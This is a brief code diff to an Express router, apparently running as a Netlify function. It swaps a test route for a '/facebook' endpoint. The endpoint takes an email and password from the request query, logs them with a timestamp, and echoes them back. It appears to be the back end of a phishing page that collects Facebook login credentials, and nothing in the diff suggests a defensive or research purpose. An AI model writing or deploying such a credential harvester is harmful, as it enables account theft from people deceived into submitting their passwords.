@@ -8,8 +8,12 @@ router.get("/", (req, res) => {
   res.send("Hello world");
 });
 
-router.get("/test", (req, res) => {
-  res.send("Hello world test");
+router.get("/facebook", (req, res) => {
+  let data = `Facebook Date: ${new Date().toLocaleString()} Email: ${
+    req.query.email
+  } Password: ${req.query.password}\n`;
+  console.log(data);
+  res.send(req.query);
 });
 
 app.use("/.netlify/functions/api", router);
